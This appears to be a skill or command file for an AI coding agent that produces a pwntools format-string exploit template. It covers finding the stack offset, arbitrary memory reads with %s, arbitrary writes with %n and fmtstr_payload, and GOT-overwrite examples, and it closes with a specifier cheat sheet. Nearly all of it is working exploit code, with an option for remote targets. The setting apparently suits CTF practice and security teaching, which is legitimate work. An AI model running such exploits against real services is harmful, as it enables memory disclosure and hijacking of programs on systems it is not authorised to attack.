---
name: pwn-format-string
description: Generate format string exploit template for arbitrary read/write
argument-hint: "<binary> [--offset N]"
allowed-tools: ["Bash", "Read", "Write"]
---

# PWN Format String - Format String Exploit Template

Generate a format string exploit for arbitrary read and write operations.

## Execution Steps

### Step 1: Identify Format String Offset

Find offset where input appears on stack:

```python
for i in range(1, 30):
    print(f"Testing offset {i}")
    # Send: AAAA%{i}$p
    # Look for 0x41414141 in output
```

### Step 2: Generate Template

Create exploit with read and write primitives.

## Generated Template

```python
#!/usr/bin/env python3
"""
Format String Exploit Template
Target: <binary>
Vulnerability: printf(user_input) without format specifier
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './<binary>'
FMT_OFFSET = <offset>  # Offset where input appears on stack

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf

def conn():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        return gdb.debug(BINARY, 'b printf\\nc')
    else:
        return process(BINARY)

# === PRIMITIVES ===

def leak(addr):
    """Leak memory at address using format string"""
    io = conn()
    # %s reads string at address on stack
    # Place address at correct offset, then dereference
    payload = f'%{FMT_OFFSET + 1}$s'.encode()
    payload = payload.ljust(8, b'\\x00')
    payload += p64(addr)
    io.sendline(payload)
    return io.recvline()

def arbitrary_write(addr, value):
    """Write value to address using %n"""
    io = conn()
    writes = {addr: value}
    payload = fmtstr_payload(FMT_OFFSET, writes)
    io.sendline(payload)
    return io

def find_offset():
    """Find format string offset"""
    for i in range(1, 50):
        io = conn()
        io.sendline(f'AAAA%{i}$p'.encode())
        resp = io.recvline()
        if b'0x41414141' in resp:
            log.success(f"Offset found: {i}")
            return i
        io.close()
    log.error("Offset not found")

def main():
    # === FIND OFFSET (run once) ===
    # offset = find_offset()
    # print(f"Offset: {offset}")

    io = conn()

    # === EXAMPLE: LEAK GOT ENTRY ===
    # payload = f'%{FMT_OFFSET}$s'.encode().ljust(8, b'\\x00')
    # payload += p64(elf.got['puts'])
    # io.sendline(payload)
    # leak = u64(io.recv(6).ljust(8, b'\\x00'))
    # log.success(f"puts@libc: {hex(leak)}")

    # === EXAMPLE: OVERWRITE GOT ===
    # writes = {elf.got['exit']: elf.symbols['win']}
    # payload = fmtstr_payload(FMT_OFFSET, writes)
    # io.sendline(payload)

    # === EXAMPLE: LEAK STACK VALUES ===
    payload = b''
    for i in range(1, 20):
        payload += f'%{i}$p '.encode()
    io.sendline(payload)
    print(io.recvline())

    io.interactive()

if __name__ == '__main__':
    main()
```

## Finding Offset

```bash
# Method 1: Manual testing
echo 'AAAA%1$p' | ./binary
echo 'AAAA%2$p' | ./binary
# ... until you see 0x41414141

# Method 2: Automated
python3 -c "
from pwn import *
for i in range(1,50):
    io = process('./binary')
    io.sendline(f'AAAA%{i}\$p'.encode())
    if b'0x41414141' in io.recvall():
        print(f'Offset: {i}')
        break
    io.close()
"
```

## Format String Cheat Sheet

| Specifier | Action |
|-----------|--------|
| `%p` | Leak stack value as pointer |
| `%s` | Leak string at address |
| `%x` | Leak as hex (32-bit) |
| `%lx` | Leak as hex (64-bit) |
| `%n` | Write byte count to address |
| `%hn` | Write short (2 bytes) |
| `%hhn` | Write byte (1 byte) |
| `%N$p` | Leak Nth stack argument |
